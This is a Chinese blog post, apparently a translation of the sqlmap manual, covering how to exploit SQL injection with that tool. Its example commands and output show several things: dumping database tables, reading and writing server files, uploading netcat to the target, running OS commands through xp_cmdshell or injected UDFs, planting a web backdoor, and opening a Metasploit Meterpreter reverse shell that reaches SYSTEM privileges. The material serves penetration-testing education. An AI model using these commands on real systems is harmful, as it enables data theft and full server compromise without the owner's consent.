+<h3 id="列出数据库系统的数据库">列出数据库系统的数据库</h3>
+
+<p>参数：&ndash;dbs
+当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
+
+<h3 id="列举数据库表">列举数据库表</h3>
+
+<p>参数：&ndash;tables,&ndash;exclude-sysdbs,-D
+当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
+如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。
+&ndash;exclude-sysdbs参数是指包含了所有的系统数据库。
+需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>
+
+<h3 id="列举数据库表中的字段">列举数据库表中的字段</h3>
+
+<p>参数：&ndash;columns,-C,-T,-D
+当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
+如果没有使用-D参数指定数据库时，默认会使用当前数据库。
+列举一个SQLite的例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; --columns -D testdb -T users -C name
+[...]
+Database: SQLite_masterdb
+Table: users
+[3 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| id      | INTEGER |
+| name    | TEXT    |
+| surname | TEXT    |
++---------+---------+
+</code></pre>
+
+<h3 id="列举数据库系统的架构">列举数据库系统的架构</h3>
+
+<p>参数：&ndash;schema,&ndash;exclude-sysdbs
+用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。
+加上&ndash;exclude-sysdbs参数，将不会获取数据库自带的系统库内容。
+MySQL例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot; --schema --batch --exclude-sysdbs
+[...]
+Database: owasp10
+Table: accounts
+[4 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| cid         | int(11) |
+| mysignature | text    |
+| password    | text    |
+| username    | text    |
++-------------+---------+
+Database: owasp10
+Table: blogs_table
+[4 columns]
++--------------+----------+
+| Column       | Type     |
++--------------+----------+
+| date         | datetime |
+| blogger_name | text     |
+| cid          | int(11)  |
+| comment      | text     |
++--------------+----------+
+Database: owasp10
+Table: hitlog
+[6 columns]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| date     | datetime |
+| browser  | text     |
+| cid      | int(11)  |
+| hostname | text     |
+| ip       | text     |
+| referer  | text     |
++----------+----------+
+Database: testdb
+Table: users
+[3 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
+[...]
+</code></pre>
+
+<h3 id="获取表中数据个数">获取表中数据个数</h3>
+
+<p>参数：&ndash;count
+有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。
+列举一个Microsoft SQL Server例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot; --count -D testdb
+[...]
+Database: testdb
++----------------+---------+
+| Table          | Entries |
++----------------+---------+
+| dbo.users      | 4       |
+| dbo.users_blob | 2       |
++----------------+---------+
+</code></pre>
+
+<h3 id="获取整个表的数据">获取整个表的数据</h3>
+
+<p>参数：&ndash;dump,-C,-T,-D,&ndash;start,&ndash;stop,&ndash;first,&ndash;last
+如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。
+使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。
+列举一个Firebird的例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot; --dump -T users
+[...]
+Database: Firebird_masterdb
+Table: USERS
+[4 entries]
++----+--------+------------+
+| ID | NAME   | SURNAME    |
++----+--------+------------+
+| 1  | luther | blisset    |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
+</code></pre>
+
+<p>可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。
+也可以用-dump跟-C获取指定的字段内容。
+sqlmap为每个表生成了一个CSV文件。
+如果你只想获取一段数据，可以使用&ndash;start和&ndash;stop参数，例如，你只想获取第一段数据可hi使用&ndash;stop 1，如果想获取第二段与第三段数据，使用参数 &ndash;start 1 &ndash;stop 3。
+也可以用&ndash;first与&ndash;last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用&ndash;first 3 &ndash;last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
+
+<h3 id="获取所有数据库表的内容">获取所有数据库表的内容</h3>
+
+<p>参数：&ndash;dump-all,&ndash;exclude-sysdbs
+使用&ndash;dump-all参数获取所有数据库表的内容，可同时加上&ndash;exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p>
+
+<h3 id="搜索字段-表-数据库">搜索字段，表，数据库</h3>
+
+<p>参数：&ndash;search,-C,-T,-D
+&ndash;search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
+可以在一下三种情况下使用：</p>
+
+<pre><code>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
+-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
+-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
+</code></pre>
+
+<h3 id="运行自定义的sql语句">运行自定义的SQL语句</h3>
+
+<p>参数：&ndash;sql-query,&ndash;sql-shell
+sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
+如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。
+列举一个Mircrosoft SQL Server 2000的例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT 'foo'&quot; -v 1
+[...]
+[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
+[hh:mm:14] [INFO] retrieved: foo
+SELECT 'foo':    'foo'
+$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT 'foo', 'bar'&quot; -v 2
+[...]
+[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
+[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into
+distinct queries to be able to retrieve the output even if we are going blind
+[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)),
+(CHAR(32)))
+[hh:mm:50] [INFO] retrieved: foo
+[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)),
+(CHAR(32)))
+[hh:mm:50] [INFO] retrieved: bar
+[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+SELECT 'foo', 'bar':    'foo, bar'
+</code></pre>
+
+<h2 id="爆破">爆破</h2>
+
+<hr />
+
+<h3 id="暴力破解表名">暴力破解表名</h3>
+
+<p>参数：&ndash;common-tables
+当使用&ndash;tables无法获取到数据库的表时，可以使用此参数。
+通常是如下情况：</p>
+
+<pre><code>1、MySQL数据库版本小于5.0，没有information_schema表。
+2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
+3、当前用户没有权限读取系统中保存数据结构的表的权限。
+</code></pre>
+
+<p>暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。
+列举一个MySQL 4.1的例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner
+[...]
+[hh:mm:39] [INFO] testing MySQL
+[hh:mm:39] [INFO] confirming MySQL
+[hh:mm:40] [INFO] the back-end DBMS is MySQL
+[hh:mm:40] [INFO] fetching banner
+web server operating system: Windows
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS operating system: Windows
+back-end DBMS: MySQL &amp;lt; 5.0.0
+banner:    '4.1.21-community-nt'
+[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
+[hh:mm:40] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] 8
+[hh:mm:43] [INFO] retrieved: users
+Database: testdb
+[1 table]
++-------+
+| users |
++-------+
+</code></pre>
+
+<h3 id="暴力破解列名">暴力破解列名</h3>
+
+<p>参数：&ndash;common-columns
+与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p>
+
+<h2 id="用户自定义函数注入">用户自定义函数注入</h2>
+
+<hr />
+
+<p>参数：&ndash;udf-inject,&ndash;shared-lib
+你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p>
+
+<h2 id="系统文件操作">系统文件操作</h2>
+
+<hr />
+
+<h3 id="从数据库服务器中读取文件">从数据库服务器中读取文件</h3>
+
+<p>参数：&ndash;file-read
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。
+列举一个Microsoft SQL Server 2005的例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot; \
+--file-read &quot;C:/example.exe&quot; -v 1
+[...]
+[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+[hh:mm:50] [INFO] fetching file: 'C:/example.exe'
+[hh:mm:50] [INFO] the SQL query provided returns 3 entries
+C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'
+[...]
+$ ls -l output/192.168.136.129/files/C__example.exe
+-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe
+$ file output/192.168.136.129/files/C__example.exe
+output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
+80386 32-bit
+</code></pre>
+
+<h3 id="把文件上传到数据库服务器中">把文件上传到数据库服务器中</h3>
+
+<p>参数：&ndash;file-write,&ndash;file-dest
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。
+列举一个MySQL的例子：</p>
+
+<pre><code>$ file /software/nc.exe.packed
+/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
+$ ls -l /software/nc.exe.packed
+-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
+$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; --file-write \
+&quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1
+[...]
+[hh:mm:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003 or 2008
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+back-end DBMS: MySQL &amp;gt;= 5.0.0
+[...]
+do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully
+written on the back-end DBMS file system? [Y/n] y
+[hh:mm:52] [INFO] retrieved: 31744
+[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes,
+same size as the local file '/software/nc.exe.packed'
+</code></pre>
+
+<h3 id="运行任意操作系统命令">运行任意操作系统命令</h3>
+
+<p>参数：&ndash;os-cmd,&ndash;os-shell
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。
+在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。
+那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。
+列举一个PostgreSQL的例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; \
+--os-cmd id -v 1
+[...]
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: PostgreSQL
+[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
+[hh:mm:12] [INFO] testing if current user is DBA
+[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
+[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'
+[hh:mm:19] [INFO] cleaning up the database management system
+do you want to remove UDF 'sys_eval'? [Y/n] y
+do you want to remove UDF 'sys_exec'? [Y/n] y
+[hh:mm:23] [INFO] database management system cleanup finished
+[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can
+only be deleted manually
+</code></pre>
+
+<p>用&ndash;os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。
+当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p>
+
+<pre><code>1、ASP
+2、ASP.NET
+3、JSP
+4、PHP
+</code></pre>
+
+<h3 id="meterpreter配合使用">Meterpreter配合使用</h3>
+
+<p>参数：&ndash;os-pwn,&ndash;os-smbrelay,&ndash;os-bof,&ndash;priv-esc,&ndash;msf-path,&ndash;tmp-path
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：</p>
+
+<pre><code>1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
+2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
+3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
+4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof
+</code></pre>
+
+<p>列举一个MySQL例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot; --os-pwn --msf-path /software/metasploit
+[...]
+[hh:mm:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows 2003
+web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
+back-end DBMS: MySQL 5.0
+[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
+how do you want to establish the tunnel?
+[1] TCP: Metasploit Framework (default)
+[2] ICMP: icmpsh - ICMP tunneling
+&amp;gt;
+[hh:mm:32] [INFO] testing if current user is DBA
+[hh:mm:32] [INFO] fetching current user
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+&amp;gt;
+[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
+[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
+[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
+[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
+how do you want to execute the Metasploit shellcode on the back-end database underlying
+operating system?
+[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
+[2] Stand-alone payload stager (file system way)
+&amp;gt;
+[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode
+which connection type do you want to use?
+[1] Reverse TCP: Connect back from the database host to this machine (default)
+[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports
+between the specified and 65535
+[3] Bind TCP: Listen on the database host for a connection
+&amp;gt;
+which is the local address? [192.168.136.1]
+which local port number do you want to use? [60641]
+which payload do you want to use?
+[1] Meterpreter (default)
+[2] Shell
+[3] VNC
+&amp;gt;
+[hh:mm:40] [INFO] creation in progress ... done
+[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
+                                _
+                                | |      o
+_  _  _    _ _|_  __,   ,    _  | |  __    _|_
+/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
+|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
+                        /|
+                        \|
+    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
++ -- --=[ 674 exploits - 351 auxiliary
++ -- --=[ 217 payloads - 27 encoders - 8 nops
+    =[ svn r12272 updated 4 days ago (2011.04.07)
+PAYLOAD =&amp;gt; windows/meterpreter/reverse_tcp
+EXITFUNC =&amp;gt; thread
+LPORT =&amp;gt; 60641
+LHOST =&amp;gt; 192.168.136.1
+[*] Started reverse handler on 192.168.136.1:60641
+[*] Starting the payload handler...
+[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval',
+please wait..
+[*] Sending stage (749056 bytes) to 192.168.136.129
+[*] Meterpreter session 1 opened (192.168.136.1:60641 -&amp;gt; 192.168.136.129:1689) at Mon Apr 11
+hh:mm:52 +0100 2011
+meterpreter &amp;gt; Loading extension espia...success.
+meterpreter &amp;gt; Loading extension incognito...success.
+meterpreter &amp;gt; [-] The 'priv' extension has already been loaded.
+meterpreter &amp;gt; Loading extension sniffer...success.
+meterpreter &amp;gt; System Language : en_US
+OS              : Windows .NET Server (Build 3790, Service Pack 2).
+Computer        : W2K3R2
+Architecture    : x86
+Meterpreter     : x86/win32
+meterpreter &amp;gt; Server username: NT AUTHORITY\SYSTEM
+meterpreter &amp;gt; ipconfig
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+Intel(R) PRO/1000 MT Network Connection
+Hardware MAC: 00:0c:29:fc:79:39
+IP Address  : 192.168.136.129
+Netmask     : 255.255.255.0
+meterpreter &amp;gt; exit
+[*] Meterpreter session 1 closed.  Reason: User exit
+</code></pre>
+
+<p>默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server 2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。</p>
+
+  </div>
+
+  <footer>
+    <ul class="stats">
+  <li class="categories">
+    <ul>
+        
+            
+            
+                <i class="fa fa-folder"></i>
+                
+                
+                <li><a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-cyber-security">网络安全 - cyber security</a></li>
+                
+            
+        
+    </ul>
+  </li>
+  <li class="tags">
+    <ul>
+        
+            
+            
+                <i class="fa fa-tags"></i>
+                
+                
+                <li><a class="article-category-link" href="/tags/sqlmap">sqlmap</a></li>
+                
+                
+                <li><a class="article-category-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a></li>
+                
+            
+        
+    </ul>
+  </li>
+</ul>
+
+  </footer>
+
+</article>
+
+    <article class="post">
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </article>
+
+
+<ul class="actions pagination">
+    
+        <li><a href="/2015/10/namp-zoom-table/"
+                class="button big previous">Nmap速查表</a></li>
+    
+
+    
+        <li><a href="/2015/10/2015-10-13-raspberry-pie4b88be8b791aircracke5928creavere7a0b4e8a7a3e8b7afe794b1e599a8pine7a081/"
+                class="button big next">Raspberry Pi下跑aircrack和reaver破解路由器PIN码</a></li>
+    
+</ul>
+
+
+    </div>
+    
+<section id="sidebar">
+
+  
+  <section id="intro">
+    
+    
+      
+        <a href='/about' style="border-bottom: none;"><img src="/img/main/logo.jpg" class="intro-circle" width="96" alt="Website&#39;s Logo" /></a>
+      
+    
+    
+      <header>
+        <h2>Mr9esx</h2>
+        <p>95年生人，现居广州。<br/>Gopher & Pythonista。<br/>BACKEND & FRONTEND。</p>
+      </header>
+    
+    
+      <ul class="icons">
+        
+        
+  <li><a href="//github.com/mr9esx" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//telegram.me/mr9esx" target="_blank" title="telegram" class="fa fa-telegram"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="mailto:mr9esx1138099359@gmail.com" title="Email" class="fa fa-envelope"></a></li>
+
+
+      </ul>
+    
+  </section>
+
+  
+  <section class="recent-posts">
+    <div class="mini-posts">
+      <header>
+        <h3>Recent Posts</h3>
+      </header>
+      <div class="posts-container">
+        
+
+        
+          
+        
+
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/2019/06/golang-interview-question/">Go 面试题</a>
+              </h3>
+              
+              <time class="published" datetime='2019-06-24'>
+                June 24, 2019
+              </time>
+            </header>
+            
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/2019/05/2019-05-09-windows-10-e4b88be79a84-go-micro-e5ae89e8a385e7ac94e8aeb0efbc88go-mod-e6a8a1e5bc8fefbc89/">Windows 10 下的 go-micro 安装笔记（go mod 模式）</a>
+              </h3>
+              
+              <time class="published" datetime='2019-05-09'>
+                May 9, 2019
+              </time>
+            </header>
+            
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/2019/04/2019-04-28-windows-10-e5ae89e8a385-golang-grpc/">Windows 10 安装 Golang gRpc</a>
+              </h3>
+              
+              <time class="published" datetime='2019-04-28'>
+                April 28, 2019
+              </time>
+            </header>
+            
+
+          </article>
+        
+      </div>
+
+      
+        <a href=
+          
+            /
+          
+        class="button">View more posts</a>
+      
+    </div>
+  </section>
+
+  
+  
+  
+  
+  
+    <section id="categories">
+      <header>
+        <h3>
+          <a href="/categories/">Categories</a>
+        </h3>
+      </header>
+        
+          
+        
+
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a>
+                <span style="float:right;">3
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E5%86%99%E7%9C%9F-photo/">写真-PHOTO</a>
+                <span style="float:right;">9
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E5%89%81%E6%89%8B%E5%BC%80%E7%AE%B1-show-what-i-buy/">剁手开箱-SHOW-WHAT-I-BUY</a>
+                <span style="float:right;">3
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E5%BC%80%E5%8F%91-develop/">开发-DEVELOP</a>
+                <span style="float:right;">111
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E6%8A%98%E8%85%BE-make-trouble/">折腾-MAKE-TROUBLE</a>
+                <span style="float:right;">3
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E6%96%87%E7%AB%A0/">文章</a>
+                <span style="float:right;">14
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article style="font-size: 14px;">
+            <header>
+              
+                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-cyber-security/">网络安全-CYBER-SECURITY</a>
+                <span style="float:right;">20
+              
+            </header>
+          </article>
+        </p>
+        
+    </section>
+  
+  
+
+  
+  
+
+  <section id="mini-bio">
+    <video src="" id="sidebar-video" type="video/mp4" autoplay autobuffer loop></video>
+  </section>
+
+  
+  <section id="footer">
+    
+
+    <p class="copyright">
+      <svg t="1540987830423" class="icon" style="" viewBox="200 200 580 580" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1025" xmlns:xlink="http://www.w3.org/1999/xlink" width="41" height="30"><path d="M267.680514 709.995914c-10.559782-78.799883 35.66417-188.681389 73.719233-234.008756-2.291273-27.495282-5.877615-98.126277 15.34157-110.279988 17.533223-10.061679 60.668937 14.544606 88.064598 32.575931l272.16344 1.892792c27.19642-18.031326 72.723028-44.729643 90.853974-34.369102 23.610079 13.5484 16.437397 99.520965 14.644226 117.851152 36.461134 43.833058 60.370075 176.428057 60.370075 234.407238" fill="#BDBDBD" p-id="1027"></path><path d="M809.915361 689.075591c1.295068 28.790349-26.698317 39.648993-63.757174 39.648993s-72.125304-7.770406-70.332134-39.648993c1.69355-30.68314 36.261893-55.588287 67.044654-55.588287 34.468723 0 65.749587 24.905146 67.044654 55.588287zM319.184356 689.075591c1.295068 28.790349-26.698317 39.648993-63.757174 39.648993s-72.125304-7.770406-70.332134-39.648993c1.69355-30.68314 36.261893-55.588287 67.044654-55.588287 34.369102 0 65.649966 24.905146 67.044654 55.588287z" fill="#BDBDBD" p-id="1028"></path><path d="M193.562798 664.768168c-10.559782-78.799883 35.66417-188.681389 73.719233-234.008756-2.291273-27.495282-5.877615-98.126277 15.341571-110.279988 17.533223-10.061679 60.668937 14.544606 88.064597 32.575932l272.16344 1.892791c27.19642-18.031326 72.723028-44.729643 90.853974-34.369102 23.610079 13.5484 16.437397 99.520965 14.644226 117.851152 36.461134 43.833058 60.370075 176.428057 60.370075 234.407239" fill="#FFFFFF" p-id="1029"></path><path d="M814.996011 672.737815h-12.552194c0-30.284658-6.375717-77.803677-16.337776-121.039012-11.85485-51.802705-26.997179-90.555112-42.53799-109.283782-1.095826-1.295068-1.593929-2.988618-1.394688-4.682168 4.781788-47.917502 3.187859-103.306547-11.555988-111.774297-4.184065-2.390894-22.414632-6.87382-84.279015 34.169861-0.996206 0.697344-2.291273 1.095826-3.486721 1.095827l-272.16344-1.892792c-1.195447 0-2.390894-0.398482-3.3871-0.996205-59.672731-39.15089-77.504816-34.667964-81.489639-32.376691-12.054091 6.87382-16.835879 47.817881-12.153711 104.302753 0.099621 1.69355-0.398482 3.287479-1.494309 4.582547-37.158478 44.131919-82.585466 152.618737-72.324545 229.127347l-12.452573 1.69355c-4.881409-36.461134 1.793171-83.482051 18.927911-132.495379 14.345364-41.143302 34.667964-79.89571 54.592081-104.402373-1.095826-13.64802-2.390894-37.35772-0.996206-59.274249 1.992412-30.185037 8.368129-48.017122 19.625255-54.49246 15.640432-8.965853 47.020916 1.69355 93.145248 31.679346l268.377858 1.793171c47.61864-31.380484 79.89571-42.737231 95.934624-33.572138 12.153711 6.973441 18.72867 27.395661 20.023737 62.362487 0.896585 23.610079-0.896585 47.61864-1.992411 58.975387 37.258099 48.116743 59.971593 179.516295 59.971592 236.49927z" fill="#6B3437" p-id="1030"></path><path d="M871.680125 679.213153H107.590233c-4.084444 0-7.371923-3.287479-7.371924-7.371923s3.287479-7.371923 7.371924-7.371924h764.089892c4.084444 0 7.371923 3.287479 7.371923 7.371924s-3.287479 7.371923-7.371923 7.371923z" fill="#6B3437" p-id="1031"></path><path d="M330.441483 517.03084a21.717288 14.843467 90 1 0 29.686934 0 21.717288 14.843467 90 1 0-29.686934 0Z" fill="" p-id="1032"></path><path d="M505.076369 364.01362h138.572235s66.247689-42.039887 84.97636-35.76379c18.72867 6.276097 26.598696 28.491487 17.533223 115.559879 0 0 30.882382 57.481078 30.583519 72.523786 0 0-87.865357 127.315108-242.078023 33.572138-78.999124-55.389046-63.856795-152.319875-29.587314-185.892013z" fill="#FEAE02" p-id="1033"></path><path d="M604.298473 517.03084a21.717288 14.843467 90 1 0 29.686934 0 21.717288 14.843467 90 1 0-29.686934 0Z" fill="" p-id="1034"></path><path d="M467.021306 580.688394c-6.076856 0-11.755229-2.689756-15.540812-7.471544-1.394688-1.793171-1.095826-4.283685 0.597724-5.777994 1.793171-1.394688 4.283685-1.095826 5.777994 0.597723 2.291273 2.789376 5.578753 4.383306 9.165094 4.383306 6.475338 0 